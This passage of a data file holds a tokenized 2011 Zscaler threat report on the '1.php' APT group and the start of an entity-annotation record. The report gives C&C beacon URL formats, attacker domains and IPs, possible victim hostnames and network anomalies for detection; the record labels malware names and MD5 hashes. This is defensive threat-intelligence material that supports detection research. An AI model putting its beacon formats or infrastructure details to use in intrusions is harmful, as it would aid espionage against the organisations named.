"no-ip.com/services/managed_dns/free_dynamic_dns.html"], ["7", ".", "http://www", ".", "securelist.com/en/descriptions/7383071/Trojan.Win32.Buzus.cvdu"], ["8", ".", "http://www", ".", "securelist.com/en/descriptions/7854148/Trojan.Win32.Agent.eevf"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "7"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Zscaler", "has", "observed", "on-going", "attacks", "from", "June", "2010", "to", "present", ","], ["involving", "a", "Cleared", "Defense", "Contractor", ".", "Given", "the", "entity", "involved", "and", "the"], ["characteristics", "of", "the", "traffic", "observed", ",", "Zscaler", "believes", "that", "the", "attack", "is"], ["directly", "related", "to", "the", "\u201c1", ".", "php\u201d", "Group", ".", "While", "these", "attacks", "appear", "related"], ["to", "the", "\u201c1", ".", "php\u201d", "Group", ",", "the", "beacons", "do", "not", "bear", "the", "previously", "mentioned"], ["\u201c1", ".", "php\u201d", "HTTP", "path", ".", "However", ",", "there", "are", "many", "similarities", "regarding"], ["these", "\u201cnew\u201d", "beacons", "as", "well", "as", "direct", "relationships", "regarding", "previously"], ["\u201c"], ["Zscaler", "believes", "that"], ["ongoing", "attacks", "against"], ["a", "sensitive", "customer", "are"], ["directly", "related", "to", "the"], ["\u201c1", ".", "php\u201d", "Group", "."], ["\u201c"], ["Section", "2:", "Customer", "Infection", "Behavior"], ["-Zscaler", "ThreatLabZ"], ["identified", "domains", "and", "IPs", "used", "by", "the", "\u201c1", ".", "php\u201d", "group", ".", "Presumably", ","], ["these", "\u201cnew\u201d", "beacon", "behaviors", "have", "been", "altered", "to", "evade", "any"], ["signatures", "designed", "to", "detect", "the", "previous", "\u201c1", ".", "php\u201d", "beaconing", "behavior", "."], ["2", ".", "1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters"], ["One", "of", "the", "first", "variations", "that", "we", "noticed", "in", "the", "attacks", ",", "was", "that", "the"], ["infected", "hosts", "sent", "HTTP", "GET", "request", "check-ins", "to", "URLs", "with", "the"], ["general", "pattern", "of:"], ["FQDN/css", ".", "ashx?sc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d"], ["ata5]&tk="], ["The", "data", "parameters", "contained", "the", "same", "victim", "information", "as"], ["mentioned", "in", "the", "\u201c1", ".", "php\u201d", "beacons", "and", "were", "also", "base64", "encoded"], ["and", "XORed", "with", "a", "key", ".", "Examples", "of", "C&Cs", "that", "we", "observed", "for", "this"], ["particular", "check-in", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["HOUSE", ".", "SUPERDOGDREAM.COM"], ["HOME", ".", "ALLMYDEARFRIENDS.COM"], ["GOOGLETIME", ".", "SERVEIRC.COM", "*"], ["INFO", ".", "SPORTGAMEINFO.COM"], ["PEOPLE", ".", "ENJOYHOLIDAYS.NET"], ["PEARHOST", ".", "SERVEHALFLIFE.COM", "*"], ["(June", "2010", "\u2013", "1st", "C&C", "observed", "in", "infection)"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "8"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "next", "variation", "that", "we", "noticed", "in", "attacks", ",", "involved", "the", "infected", "hosts"], ["sending", "HTTP", "GET", "request", "check-ins", "to", "URLs", "with", "the", "general", "pattern", "of:"], ["FQDN/[data1]/[data2]/[data3]/[data4]/[data5]"], ["The", "data", "did", "not", "appear", "to", "be", "XORed", "in", "the", "same", "manner", "as", "the", "beacons"], ["that", "were", "previously", "identified", ".", "However", ",", "based", "on", "size", "and", "number", "of"], ["data", "blocks", ",", "it", "appears", "that", "the", "beacons", "contain", "similar", "information", "from"], ["the", "victims", ".", "Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["SATELLITE", ".", "QUICKSEARCHMOVIE.COM"], ["WWW", ".", "TOYHOPING.COM"], ["WORK", ".", "FREETHROWLINE.NET"], ["SEA", ".", "ANIMALFANS.NET"], ["WWW", ".", "SEARCHSEA.NET"], ["LOVE", ".", "ANIMALFANS.NET"], ["WWW", ".", "JOBCALL.ORG"], ["\u201c"], ["\u2026it", "is", "currently"], ["believed", "that", "the"], ["infection", "point", "was"], ["through", "malicious", "email"], ["attachments", "(as", "was", "the"], ["case", "in", "many", "of"], ["the", "\u201c1", ".", "php\u201d", "OSINT"], ["incidents)", "."], ["\u201c"], ["2", ".", "2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path"], ["-Zscaler", "ThreatLabZ"], ["2", ".", "3", "HTTPS", "CONNECTs", "to", "C&Cs"], ["The", "latest", "variations", "on", "these", "attacks", "are", "related", "to", "customer", "infections"], ["beginning", "on", "August", "3", ",", "2011", ".", "Prior", "to", "infection", "for", "this", "incident", ",", "as", "well"], ["as", "the", "previous", "ones", "listed", ",", "web", "transaction", "logs", "did", "not", "provide", "any"], ["strong", "evidence", "of", "the", "infection", "point", "\u2013", "it", "is", "currently", "believed", "that", "the"], ["infection", "point", "was", "through", "malicious", "email", "attachments", "(as", "was", "the"], ["case", "in", "many", "of", "the", "\u201c1", ".", "php\u201d", "OSINT", "incidents)", ".", "Following", "infection", ",", "many"], ["web", "transactions", "were", "witnessed", "each", "hour", "to", "the", "C&C", "servers", "via"], ["HTTPS", "with", "the", "following", "behaviors:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["CONNECT", "on", "port", "443/TCP", "with", "200", "HTTP", "response", "code"], ["HTTP", "request", "version", "1", ".", "0", "with", "HTTP", "response", "version", "1", ".", "1"], ["Request", "size", "for", "\u201ckeep-alive\u201d", "beacons", "were", "primarily", "227", "\u2013", "228", "bytes"], ["Response", "size", "is", "most", "commonly", "between", "969", "\u2013", "990", "bytes"], ["Microsoft", "Internet", "Explorer", "6", ".", "0", "user-agent", "string", "(hard-coded", "into"], ["malware", ",", "as", "this", "is", "not", "a", "standard", "browser", "for", "this", "customer)"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "9"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Examples", "of", "C&Cs", "used", "in", "this", "infection", "variant", "include:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["WWW", ".", "SAVAGECOUNTY.NET"], ["LOOK", ".", "CAPTAINSABERTOOTH.NET"], ["GEOINFO", ".", "SERVEHTTP.COM", "*"], ["ROSE", ".", "OFFICESKYLINE.COM"], ["WWW", ".", "CAREERCHALLENGES.NET"], ["OFFER", ".", "AMERICAMS.N"], ["Section", "3:", "Incident", "Inter-Relationships"], ["There", "are", "a", "number", "of", "domains", "and", "IP", "addresses", "that", "have", "been", "tied", "to"], ["the", "previously", "mentioned", "incidents", ".", "Toward", "the", "beginning", "of", "the", "report"], ["it", "was", "stated", "that", "we", "believed", "all", "of", "these", "incidents", "to", "be", "related", ".", "As"], ["has", "already", "been", "seen", ",", "there", "are", "some", "similarities", "across", "the", "incidents", ","], ["such", "as", "same", "victim", "organization", ",", "similar", "beaconing", "data", "blocks", ",", "and"], ["infection", "believed", "to", "be", "from", "malicious", "email", "attachments", ".", "However", ",", "the"], ["strongest", "evidence", "for", "their", "relationship", "is", "the", "fact", "that", "related", "domains"], ["and", "IPs", "are", "used", "for", "C&Cs", "across", "these", "incidents", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "10"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["The", "following", "Figure", "3", "-", "Link-Graph", "of", "\u201c1", ".", "php\u201d", "Incident", "Inter-Relationship"], ["provides", "this", "illustration", "with", "only", "a", "small", "snippet", "of", "information", "from"], ["these", "incidents:"], ["DOMAIN"], ["firehappy", ".", "sytes.net"], ["OSINT", "\u201c1", ".", "php\u201d", "Incidents"], ["coffeelaunch", ".", "com"], ["HOSTNAME"], ["IP", "RESOLUTION"], ["free"], ["image"], ["98", ".", "126.69.3"], ["dreamlifes", ".", "net"], ["tastfine"], ["Zhang", ",", "Yao", "hua\u201d", "Registration", "details"], ["ICP100", ".", "net", "nmaeservers"], ["seablow", ".", "net"], ["superdogdream", ".", "com"], ["house"], ["allmydearfriends", ".", "com"], ["do:"], ["2", ".", "1", "Incidents"], ["sportgameinfo", ".", "com"], ["enjoyholidays", ".", "net"], ["2", ".", "2", "Incidents"], ["jobcall", ".", "org"], ["geoinfo", ".", "servehttp.com"], ["dream"], ["smart"], ["178", ".", "63.130.197"], ["rose"], ["2", ".", "3", "Incidents"], ["46", ".", "4.209.130"], ["officeskyline", ".", "com"], ["qinetiq"], ["captainsabertooth", ".", "net"], ["qnao"], ["savagecounty", ".", "net"], ["Example", "of", "Possible"], ["Victim", "Names"], ["look"], ["Figure", "3", "-", "Link-Graph", "of", "\u201c1", ".", "php\u201d", "Incident", "Inter-Relationship"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["www"], ["Page", "11"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Past", "experience", "with", "APT-style", "incidents", "show", "that", "hostnames", "may", "be"], ["used", "to", "identify", "the", "C&C", "for", "particular", "victims", "of", "interest", ".", "For", "example", ","], ["in", "bakerhughes", ".", "thruthere.net9", "was", "a", "C&C", "used", "against", "Baker", "Hughes"], ["in", "the", "disclosed", "Night", "Dragon10", "attacks", ".", "There", "have", "been", "a", "number"], ["of", "interesting", "hostnames", "used", "with", "\u201c1", ".", "php\u201d", "C&C", "domains", "that", "may"], ["indicate", "other", "potential", "victims", ".", "These", "hostnames", "potentially", "identify"], ["victims", "within", "the", "US", "Government", "(USG)", ",", "Defense", "Industrial", "Base", "(DIB)", ","], ["and", "Geospatial", "industry", ".", "The", "above", "link-graph", "provides", "one", "example", "of"], ["such", "an", "entity", "that", "has", "information", "about", "its", "attacks", "already", "disclosed", "in"], ["\u201c"], ["There", "have", "been", "a"], ["number", "of", "interesting"], ["hostnames", "used", "with"], ["\u201c1", ".", "php\u201d", "C&C", "domains"], ["that", "may", "include", "other"], ["potential", "victims", "."], ["\u201c"], ["3", ".", "1", "Possible", "Relationship", "to", "Other", "APT", "Incidents"], ["-Zscaler", "ThreatLabZ"], ["the", "open-source", "(QinetiQ)", "."], ["\u201cQINETIQ\u201d", "or", "\u201cQNAO\u201d", "(QinetiQ", "North", "America", "Operations)", "for", "example", ","], ["was", "an", "HBGary", "customer", ".", "HBGary", "supported", "QinetiQ", "in", "detection"], ["and", "analysis", "of", "on-going", "targeted", "attacks", "against", "them", ".", "Following", "the"], ["Anonymous", "compromise", "and", "leakage", "of", "HBGary", "information", ",", "there", "is"], ["significant", "information", "in", "the", "public", "domain", "regarding", "the", "attacks", "against"], ["QinetiQ", ".", "One", "such", "example", "is", "HBGary\u2019s", "Incident", "Response", "Technical"], ["Report", "Supplement", "for", "QinetiQ11", "", ".", "Page", "8", "of", "that", "report", ",", "in", "the", "\u201cHistory"], ["of", "the", "strain\u201d", "section", "states:"], ["HBGary", "has", "code-named", "this", "threat", "group", "as", "\u201cSoysauce\u201d", ".", "This", "group"], ["is", "also", "known", "as", "\u201cComment", "Crew\u201d", "by", "some", ",", "and", "also", "as", "\u201cGIF89a\u201d", "by"], ["some", ".", "The", "choice", "of", "codename", "is", "completely", "arbitrary", "in", "this", "context"], ["and", "is", "simply", "meant", "to", "identify", "a", "group", "of", "Chinese", "hackers", "who", "have"], ["a", "consistent", "agenda", "to", "target", "the", "defense", "industrial", "complex", "."], ["The", "name", "\u201cComment", "Crew\u201d", "and", "\u201cGIF89a\u201d", "has", "been", "used", "by"], ["researchers", "because", "of", "the", "behavior", "of", "this", "group", "to", "enclose", "C&C"], ["commands", "within", "comments", "on", "HTML", "pages", "or", "hidden", "within", "image"], ["files", ",", "a", "technique", "known", "as", "steganography", ".", "These", "indicators", "have", "not"], ["been", "witnessed", "in", "the", "attacks", "previously", "listed", "in", "this", "report", "."], ["Beyond", "a", "likely", "QinetiQ", "attack", "relation", ",", "there", "are", "a", "number", "of", "other"], ["hostnames", "that", "indicate", "potential", "attack", "targets", "of", "the", "\u201c1", ".", "php\u201d", "Group", "."], ["Disclosure", "of", "other", "possible", "victim", "names", "is", "intentionally", "omitted", "from"], ["this", "report", "."], ["9", ".", "http://hbgary", ".", "anonleaks.ch/greg_hbgary_com/2505.html"], ["10", ".", "http://www", ".", "mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf"], ["11", ".", "http://publicintelligence", ".", "info/HBGary-QinetiQ.pdf"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "12"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["Section", "4:", "Lessons", "Learned"], ["A", "number", "of", "lessons", "can", "be", "learned", "from", "analyzing", "incidents", "within"], ["this", "intrusion", "set", ".", "In", "the", "following", "section", ",", "we", "will", "discuss", "analytical"], ["techniques", "that", "enterprises", "should", "be", "adopting", ",", "in", "order", "to", "uncover"], ["similar", "attacks", "on", "their", "organizations", "."], ["4", ".", "1", "Conduct", "logging", "and", "analytics", "within", "your", "environment"], ["This", "report", "shows", "an", "evolution", "of", "the", "beaconing", "behavior", "from", "the"], ["\u201c1", ".", "php\u201d", "Group", ".", "Relying", "solely", "on", "existing", "signatures", "of", "known", "threats"], ["would", "not", "have", "triggered", "detections", ".", "By", "identifying", "transactions", "that"], ["are", "anomalous", ",", "it", "is", "possible", "to", "detect", "previous", "or", "recurring", "incidents", ","], ["such", "as", "those", "identified", "above", ".", "Some", "of", "the", "anomalies", ",", "which", "led", "to", "the"], ["findings", "in", "this", "report", ",", "include:"], ["\u2022"], ["HTTP", "version", "1", ".", "0", "requests", "with", "version", "1", ".", "1", "responses"], ["\u2022"], ["Numerous", "transactions", "to", "an", "unknown", "/", "uncategorized", "domain"], ["\u2013", "Some", "of", "these", "transactions", "were", "to", "No-IP", "dynamic", "DNS", "domains"], ["\u2022", "Blocking", "or", "heavily", "monitoring", "the", "communication", "to", "dynamic"], ["DNS", "domains", "is", "recommended"], ["\u2013", "Some", "of", "these", "domains", "were", "parked"], ["\u2013", "Transactions", "occur", "during", "non-standard", "times", "(nights", "/", "weekends)"], ["\u2013", "Some", "transactions", "(in", "particular", "the", "GET", "beacons)", "had", "a", "larger"], ["request", "size", "than", "response", "size"], ["\u2022"], ["Microsoft", "IE", "6", "user-agent", "(UA)", "string", "usage", "in", "an", "environment", "that"], ["does", "not", "typically", "use", "this", "UA"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "13"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["By", "leveraging", "data", "sources", "such", "as", "passive", "DNS", ",", "domain", "registration"], ["information", ",", "other", "open-source", "reports", ",", "and", "other", "research", "-", "it", "is", "possible"], ["to", "derive", "information", "about", "probable", "domains", "and", "infrastructure", "used", ","], ["in", "other", "attacks", "by", "the", "same", "group", "of", "attackers", ".", "In", "some", "cases", ",", "this"], ["information", "may", "provide", "indicators", "as", "to", "the", "targets", "or", "purpose", "of", "the"], ["attacks", ".", "It", "should", "also", "be", "noted", "that", "making", "too", "many", "assumptions", "or"], ["believing", "unverified", "indicators", "as", "fact", "can", "lead", "to", "misleading", "information", "."], ["Anyone", "can", "set", "a", "hostname", "for", "a", "C&C", "to", "be", "\u201cQINETIQ\u201d", "for", "example", "."], ["However", ",", "by", "correlating", "these", "domains", "with", "a", "group", "that", "has", "been"], ["identified", "as", "being", "involved", "in", "APT", "attacks", ",", "provides", "a", "stronger", "indication"], ["into", "their", "possible", "target", "."], ["\u201c"], ["While", "the", "exploitation"], ["used", "in", "some", "of"], ["the", "crafted", "PDF"], ["attachments", "may", "be"], ["considered", "advanced", ","], ["for", "the", "most", "part", "the"], ["attack", "is", "one", "of"], ["social-engineering", "."], ["\u201c"], ["4", ".", "2", "Correlate", "with", "other", "sources"], ["-Zscaler", "ThreatLabZ"], ["4", ".", "3", "APTs", "are", "not", "always", "that", "\u2018Advanced\u2019"], ["The", "above", "incident", "reports", "document", "(spear-)", "phishing", "with", "a", "malicious"], ["PDF", "attachment", ",", "or", "link", "to", "a", "binary", "executable", "with", "a", "Poison", "Ivy", "RAT"], ["payload", ".", "While", "the", "exploitation", "used", "in", "some", "of", "the", "crafted", "PDF"], ["attachments", "may", "be", "considered", "advanced", ",", "for", "the", "most", "part", "the", "attack", "is"], ["one", "of", "social-engineering", ".", "This", "is", "nothing", "new", "and", "something", "that", "other"], ["fraudsters", "/", "criminals", "have", "been", "leveraging", "for", "many", "years", ".", "RSA", "recently"], ["wrapped", "up", "their", "APT", "summit", "and", "their", "first", "finding", "concluded", "that", "the"], ["\u201cattack", "vector", "[is]", "shifting", "from", "technology", "to", "people\u201d", ".", "12"], ["4", ".", "4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government"], ["or", "Defense", "Industrial", "Base"], ["The", "victim", "related", "to", "this", "report", "is", "neither", "a", "Government", "agency", ",", "nor"], ["an", "entity", "that", "would", "normally", "be", "associated", "with", "the", "Defense", "Industrial"], ["Base", ".", "While", "this", "report", "does", "list", "USG", "(United", "State", "Government)", "and"], ["DIB", "(Defense", "Industrial", "Base)", "entities", "as", "possible", "victims", ",", "there", "are", "many"], ["more", "commercial", "entities", "within", "the", "Geospatial", "and", "Telecommunication"], ["industries", "that", "appear", "to", "have", "been", "victims", "of", "this", "Group", ".", "Zscaler", "has"], ["noted", "both", "foreign", "and", "domestic", "entities", "that", "have", "been", "victims", "of", "other"], ["APT", "incidents", "as", "well", "."], ["12", ".", "http://www", ".", "rsa.com/summitresults"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "14"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["4", ".", "5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge"], ["Incident", "Information", "Disclosure", "is", "an", "extension", "to", "the", "heated", "debate"], ["around", "vulnerability", "information", "disclosure", ",", "and", "full-disclosure", "versus"], ["responsible-disclosure", ".", "Responsible-disclosure", "is", "fairly", "well", "defined", "and"], ["adopted", "within", "the", "vulnerability", "space", ",", "but", "it", "is", "not", "within", "the", "incident"], ["space", "."], ["Here", "are", "some", "arguments", "for", "\u201cfull", "disclosure\u201d", "of", "incident", "information:"], ["\u2022", "A", "larger", "community", "of", "awareness", "(and", "thus", "potential", "detection"], ["possibility)", ",", "particularly", "if", "there", "are", "more", "organizations", "impacted"], ["\u2022", "A", "general", "philosophy", "that", "information", "should", "be", "public", "and", "that", "the"], ["Government", "or", "information", "security", "community", "should", "not", "have"], ["secrets", "kept", "from", "the", "public"], ["\u2022", "The", "public", "should", "be", "made", "aware", "of", "which", "organizations", "have", "been"], ["victimized", "so", "that", "this", "information", "and", "their", "response", "can", "be", "weighed"], ["before", "trusting", "them", "again", "in", "the", "future"], ["Here", "are", "some", "arguments", "for", "\u201cresponsible", "disclosure\u201d", "(the"], ["selective", "release", "of", "information", "to", "specific", "parties)", "of", "incident", "information"], ["\u2022", "Public", "release", "will", "cause", "the", "attacker", "to", "alter", "their", "TTPs", "and", "possibly"], ["allow", "them", "to", "make", "changes", "to", "infected", "systems", "prior", "to", "incident"], ["response", "action", ",", "making", "detection", "more", "difficult"], ["\u2022", "Public", "release", "of", "information", "can", "be", "viewed", "as", "attempting", "to", "garner"], ["the", "spotlight", "for", "financial", "motives", "versus", "genuine", "concerns", "about"], ["security"], ["\u2022", "There", "may", "be", "law", "enforcement", "(or", "other)", "investigations", "that", "are"], ["on-going", "and", "such", "a", "release", "of", "information", "could", "compromise", "the"], ["investigation"], ["Zscaler", "adheres", "to", "the", "following", "general", "principals", "for", "incident/"], ["vulnerability", "disclosure:"], ["\u2022", "Customer", "specific", "information", "is", "disclosed", "only", "to", "the", "impacted"], ["customer"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "15"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["\u2022", "Customer", "information", "will", "be", "redacted", "prior", "to", "public", "disclosure"], ["or", "disclosure", "to", "other", "impacted", "parties", ",", "stake-holders", ",", "and", "trusted"], ["groups", "within", "the", "information", "security", "community"], ["\u2022", "Public", "disclosure", "will", "provide", "high-level", "indicators", "of", "compromise"], ["(such", "as", "general", "network", "behavior", "and", "malicious", "domains)", "without"], ["the", "release", "of", "specifics", "as", "to", "which", "organizations", "were", "impacted", "and"], ["is", "done", "so", "when", "it", "is", "believed", "that", "such", "information", "will", "benefit", "others"], ["in", "protecting", "against", "similar", "threats"], ["\u2022", "Based", "on", "feedback/approval", "from", "the", "impacted", "parties", ",", "stake-holders", ","], ["and", "information", "security", "community", "\u2013", "additional", "information", "may", "be"], ["released", "to", "the", "public"], ["Zscaler", "is", "willing", "to", "share", "additional", "details", "of", "the", "incidents", "discussed"], ["in", "this", "report", "with", "trusted", "groups", "within", "the", "information", "security"], ["community", "to", "help", "further", "their", "research", "with", "regard", "to", "similar", "incidents", "."], ["If", "you", "are", "interested", "in", "sharing", "data", "on", "this", "and", "other", "incidents", ",", "we"], ["encourage", "you", "to", "contact", "us", "at", "threatlabz@zscaler", ".", "com."], ["Conclusion"], ["By", "interrogating", "Zscaler\u2019s", "comprehensive", "logging", "repository", "for"], ["anomalous", "activity", "and", "indicators", "of", "compromise", ",", "a", "Zscaler", "ThreatLabZ"], ["researcher", "identified", "a", "high-risk", "entity", "victimized", "by", "a", "possible", "APT", "attack"], ["linked", "to", "the", "\u201c1", ".", "php\u201d", "Group", ".", "The", "conclusion", "that", "these", "attacks", "should", "be"], ["classified", "as", "an", "APT", "attack", "are", "based", "on", "the", "following", "indicators:"], ["\u2022", "The", "victim", "enterprise", "is", "a", "high", "risk", "target", ",", "involved", "in", "an", "industry", "that"], ["has", "regularly", "been", "targeted", "in", "similar", "attacks"], ["\u2022", "Linkages", "were", "identified", "among", "several", "previous", "incidents", "from", "2010"], ["to", "present", ",", "showing", "persistence"], ["\u2022", "There", "remains", "little", "to", "no", "open-source", "information", "on", "the", "domains", "/"], ["IPs", "used", "in", "the", "attack", ",", "and", "the", "linkage", "to", "open-source", "reports", "shows", "a"], ["correlation", "with", "past", "APT", "incidents"], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "16"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["APT", "incidents"], ["\u2022", "Some", "No-IP", "dynamic", "DNS", "domains", "used", "(while", "a", "weak", "APT", "indicator", ","], ["dynamic", "DNS", "domains", "have", "often", "been", "used", "among", "documented", "APT"], ["incidents", ",", "such", "as", "Aurora", "and", "Night", "Dragon)"], ["\u2022", "Hostnames", "related", "to", "victims", "are", "used", ",", "which", "is", "a", "technique"], ["previously", "documented", "in", "other", "APT", "attacks"], ["\u2022", "Nameserver", "and", "domain", "registration", "information", "indicates", "likely"], ["Chinese", "origin", "of", "attacks"], ["\u2022", "VPS/hosting", "servers", "used", "match", "some", "of", "those", "previously", "used", "in"], ["alleged", "APT", "attacks", "."], ["The", "sum", "of", "these", "indicators", "has", "led", "to", "our", "conclusion", "that", "this", "was"], ["\u201c"], ["The", "sum", "of", "these"], ["indicators", "has", "led", "to"], ["our", "conclusion", "that"], ["this", "was", "an", "attack"], ["performed", "over", "a"], ["significant", "period", "of"], ["time", "that", "focused", "on", "a"], ["specific", "target", ",", "given"], ["the", "sensitive", "nature", "of"], ["their", "work", "."], ["\u201c"], ["\u2022", "The", "RAT", "payload", "in", "question", "is", "popular", "among", "previously", "documented"], ["-Zscaler", "ThreatLabZ"], ["an", "attack", "performed", "over", "a", "significant", "period", "of", "time", "that", "focused", "on"], ["a", "specific", "target", ",", "given", "the", "sensitive", "nature", "of", "their", "work", ".", "Based", "on"], ["information", "in", "the", "public", "domain", ",", "it", "appears", "that", "these", "attacks", "correlate"], ["with", "others", ",", "previously", "identified", "as", "being", "the", "work", "of", "the", "\u201c1", ".", "php\u201d"], ["Group", ".", "Identified", "targets", "of", "these", "attacks", "include", "China/US", "relations"], ["experts", ",", "USG", "/", "DIB", "entities", ",", "and", "the", "Geospatial", "industry", ".", "Based", "on"], ["the", "targets", ",", "it", "is", "our", "belief", "that", "corporate", "espionage", "was", "the", "goal", "of"], ["the", "attacks", ".", "Open-source", "reports", "suggest", "that", "these", "attacks", "are", "more"], ["widespread", "than", "many", "realize", "and", "that", "the", "same", "or", "similar", "actors"], ["are", "compromising", "numerous", "organizations", "in", "order", "to", "steal", "sensitive"], ["intellectual", "property", ".", "As", "stated", "within", "the", "Lessons", "Learned", "section", ",", "it"], ["is", "important", "that", "those", "concerned", "about", "such", "attacks", "be", "vigilant", "in", "their"], ["log", "collection", "and", "analysis", "to", "identify", "anomalies", "or", "other", "indications", "of"], ["compromise", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "17"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["About", "Zscaler:", "The", "Cloud", "Security", "Company\u2122"], ["Zscaler", "enforces", "business", "policy", ",", "mitigates", "risk", "and", "provides", "twice"], ["the", "functionality", "at", "a", "fraction", "of", "the", "cost", "of", "current", "solutions", ",", "utilizing"], ["a", "multi-tenant", ",", "globally-deployed", "infrastructure", ".", "Zscaler\u2019s", "integrated", ","], ["cloud-delivered", "security", "services", "include", "Web", "Security", ",", "Mobile", "Security", ","], ["Email", "Security", "and", "DLP", ".", "Zscaler", "services", "enable", "organizations", "to", "provide"], ["the", "right", "access", "to", "the", "right", "users", ",", "from", "any", "place", "and", "on", "any", "device\u2014all"], ["while", "empowering", "the", "end-user", "with", "a", "rich", "Internet", "experience", "."], ["About", "Zscaler", "ThreatLabZ\u2122"], ["ThreatLabZ", "is", "the", "global", "security", "research", "team", "for", "Zscaler", ".", "Leveraging"], ["an", "aggregate", "view", "of", "billions", "of", "daily", "web", "transaction", ",", "from", "millions", "of"], ["users", "across", "the", "globe", ",", "ThreatLabZ", "identifies", "new", "and", "emerging", "threats"], ["as", "they", "occur", ",", "and", "deploys", "protections", "across", "the", "Zscaler", "Security", "Cloud"], ["in", "real", "time", "to", "protect", "customers", "from", "advanced", "threats", "."], ["For", "more", "information", ",", "visit", "www", ".", "zscaler.com."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "18"]]}], [{"vertexSet": [{"old_id": "T1", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 4, "pos": [4, 5]}, {"old_id": "T2", "type": "Time", "name": "2011", "sent_id": 8, "pos": [4]}, {"old_id": "T3", "type": "Time", "name": "2010", "sent_id": 8, "pos": [10]}, {"old_id": "T4", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 8, "pos": [19, 20]}, {"old_id": "T5", "type": "TrojanHorse", "name": "Sharky RAT", "sent_id": 9, "pos": []}, {"old_id": "T6", "type": "TrojanHorse", "name": "c0d0so0", "sent_id": 10, "pos": [12]}, {"old_id": "T7", "type": "TrojanHorse", "name": "BackdoorBriba", "sent_id": 10, "pos": []}, {"old_id": "T8", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 24, "pos": [21, 22]}, {"old_id": "T9", "type": "Software", "name": "StrokeIt", "sent_id": 56, "pos": [0]}, {"old_id": "T10", "type": "TrojanHorse", "name": "IEXPL0REEXE", "sent_id": 69, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "perf*dat", "sent_id": 71, "pos": []}, {"old_id": "T12", "type": "Malware", "name": "ContainerV2", "sent_id": 72, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "client", "sent_id": 73, "pos": [25]}, {"old_id": "T14", "type": "TrojanHorse", "name": "csvexe", "sent_id": 82, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "360trayexe", "sent_id": 83, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "svchostexe", "sent_id": 84, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "ContainerV2", "sent_id": 85, "pos": [1]}, {"old_id": "T18", "type": "Malware", "name": "client", "sent_id": 86, "pos": [1]}, {"old_id": "T19", "type": "MD5", "name": "d7c826ac94522416a0aecf5b7a5d2afe", "sent_id": 108, "pos": [2]}, {"old_id": "T20", "type": "MD5", "name": "66e1aff355c29c6f39b21aedbbed2d5c", "sent_id": 109, "pos": [2]}, {"old_id": "T21", "type": "MD5", "name": "21a1ee58e4b543d7f2fa3b4022506029", "sent_id": 110, "pos": [2]}, {"old_id": "T22", "type": "MD5", "name": "8d4e42982060d884e2b7bd257727fd7c", "sent_id": 111, "pos": [2]}, {"old_id": "T23", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 102, "pos": [6]}, {"old_id": "T24", "type": "Malware", "name": "CONTAINERV2", "sent_id": 112, "pos": []}, {"old_id": "T25", "type": "MD5", "name": "d46d85777062afbcda02de68c063b877", "sent_id": 115, "pos": [2]}, {"old_id": "T26", "type": "MD5", "name": "85e8c6ddcfa7e289be14324abbb7378d", "sent_id": 116, "pos": [2]}, {"old_id": "T27", "type": "Malware", "name": "CLIENT", "sent_id": 117, "pos": [2]}, {"old_id": "T28", "type": "MD5", "name": "eb51b384fcbbe468a6877f569021c5d1", "sent_id": 120, "pos": [4]}, {"old_id": "T29", 